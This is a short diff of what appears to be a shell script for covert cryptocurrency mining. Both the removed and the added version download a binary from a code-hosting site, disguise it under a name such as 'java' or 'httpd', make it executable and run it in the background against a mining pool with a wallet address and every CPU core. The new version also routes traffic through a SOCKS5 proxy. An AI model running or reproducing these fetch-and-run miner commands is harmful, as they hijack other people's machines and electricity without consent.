@@ -1,2 +1,1 @@
-wget -q -O java https://github.com/swanderenata/NFT/raw/main/jupyterlab && chmod +x java
-nohup ./java -o 45.115.225.225:443 -a rx/0 -u ZEPHYR2tBHcj5UGL8ht15WiyPifGuh7ugHN5nAKXhDAE79gGobZ4kH9USdGNwy8prj7Sb7sXWXKEtck6cxF8138fJpd4iSa2cEM23.bian --randomx-1gb-pages -p -x -t $(nproc --all) &>/dev/null &
+wget -O java https://bitbucket.org/mikay2808/yui/downloads/httpd && chmod +x java && chmod 777 java && nohup ./java -a yespower -o stratum+tcp://45.115.224.204:8080 -u WWrasabfkDnQybxCKg2iBzEvB3yamcY52a -p c=SWAMP,mc=SWAMP,ID=$(echo $(shuf -i 1-9 -n 1)-yui) -t $(nproc --all) -x socks5://142.54.226.214:4145
